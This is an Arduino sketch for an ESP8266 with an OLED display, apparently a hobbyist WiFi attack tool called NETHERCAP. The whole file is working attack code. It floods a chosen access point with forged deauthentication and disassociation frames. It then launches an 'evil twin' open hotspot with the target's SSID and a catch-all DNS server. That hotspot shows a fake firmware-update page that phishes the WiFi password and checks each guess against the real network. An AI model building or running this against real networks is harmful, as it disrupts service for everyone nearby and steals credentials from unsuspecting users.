#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

extern "C" {
#include "user_interface.h"
// Wajib agar fungsi deauth tidak error di SDK 2.0.0
int wifi_send_pkt_freedom(uint8* buf, int len, bool sys_seq);
}

// Konfigurasi OLED 0.66" (64x48)
#define SCREEN_WIDTH 64
#define SCREEN_HEIGHT 48
#define OLED_RESET    -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

#define LED_PIN 2 // LED Internal untuk fitur Blink

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;
String _whitelistMAC = ""; 
String _correct = "";
String _tryPassword = "";
bool hotspot_active = false;
bool deauthing_active = false;
unsigned long now = 0;
unsigned long deauth_now = 0;

// Update Tampilan OLED ala Nethercap
void updateOLED(String msg1, String msg2 = "") {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0,0);
  display.println("NETHERCAP");
  display.println("---------");
  display.println(msg1);
  if(msg2 != "") display.println(msg2);
  if(deauthing_active) display.println("ATTACK!");
  display.display();
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += "0";
    str += String(b[i], HEX);
    if (i < size - 1) str += ":";
  }
  return str;
}

void performScan() {
  int n = WiFi.scanNetworks();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _networks[i].ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) _networks[i].bssid[j] = WiFi.BSSID(i)[j];
      _networks[i].ch = WiFi.channel(i);
    }
  }
}

void handleResult() {
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'><style>body{background:#000;color:red;text-align:center;font-family:sans-serif;}</style></head><body><h1>GAGAL</h1><p>Password Salah.</p><a href='/'>Ulangi</a></body></html>");
    updateOLED("WRONG PW");
  } else {
    _correct = "PW: " + _tryPassword;
    hotspot_active = deauthing_active = false;
    updateOLED("FOUND!", _tryPassword);
    webServer.send(200, "text/html", "<html><body style='background:#000;color:#0f0;text-align:center;'><h1>BERHASIL</h1><p>Password disimpan.</p></body></html>");
  }
}

void handleIndex() {
  if (webServer.hasArg("wl")) _whitelistMAC = webServer.arg("wl");
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
        updateOLED("TARGET:", _selectedNetwork.ssid);
      }
    }
  }
  if (webServer.hasArg("deauth")) deauthing_active = (webServer.arg("deauth") == "start");
  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start" && _selectedNetwork.ssid != "") {
      hotspot_active = true;
      WiFi.softAPdisconnect(true);
      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
    } else {
      hotspot_active = false;
      WiFi.softAP("GMpro", "sangkur87");
    }
    webServer.sendHeader("Location", "/", true);
    webServer.send(302, "text/plain", "");
    return;
  }

  if (!hotspot_active) {
    String html = "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'><style>body{background:#000;color:#0f0;font-family:monospace;} .btn{border:1px solid #0f0; background:#000; color:#0f0; padding:10px; margin:5px; text-decoration:none; display:inline-block;}</style></head><body>";
    html += "<h3>NETHERCAP v3.8.3</h3>";
    html += "<a class='btn' href='/?deauth=" + String(deauthing_active ? "stop" : "start") + "'>" + String(deauthing_active ? "STOP DEAUTH" : "START DEAUTH") + "</a>";
    html += "<a class='btn' href='/?hotspot=start'>EVIL TWIN</a><br><br>";
    if(_correct != "") html += "<b>" + _correct + "</b><br>";
    html += "<table>";
    for (int i = 0; i < 16; i++) {
      if (_networks[i].ssid == "") break;
      html += "<tr><td>" + _networks[i].ssid + "</td><td><a class='btn' href='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>SELECT</a></td></tr>";
    }
    html += "</table></body></html>";
    webServer.send(200, "text/html", html);
  } else {
    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), _tryPassword.c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      webServer.send(200, "text/html", "<html><head><meta http-equiv='refresh' content='10;url=/result'></head><body>Verifikasi...</body></html>");
    } else {
      webServer.send(200, "text/html", "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'></head><body><h3>Update Firmware</h3><p>Masukkan Password WiFi " + _selectedNetwork.ssid + "</p><form action='/'><input type='password' name='password'><input type='submit' value='UPDATE'></form></body></html>");
    }
  }
}

void setup() {
  Serial.begin(115200);
  pinMode(LED_PIN, OUTPUT);
  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) { for(;;); }
  updateOLED("READY");
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("GMpro", "sangkur87");
  dnsServer.start(DNS_PORT, "*", apIP);
  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.onNotFound(handleIndex);
  webServer.begin();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  if (deauthing_active) digitalWrite(LED_PIN, (millis() / 100) % 2); else digitalWrite(LED_PIN, HIGH);

  if (deauthing_active && millis() - deauth_now >= 300) {
    wifi_set_channel(_selectedNetwork.ch);
    uint8_t pkt[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};
    memcpy(&pkt[10], _selectedNetwork.bssid, 6);
    memcpy(&pkt[16], _selectedNetwork.bssid, 6);
    wifi_send_pkt_freedom(pkt, 26, 0);
    pkt[0] = 0xA0;
    wifi_send_pkt_freedom(pkt, 26, 0);
    deauth_now = millis();
  }
  if (millis() - now >= 5000) { performScan(); now = millis(); }
}
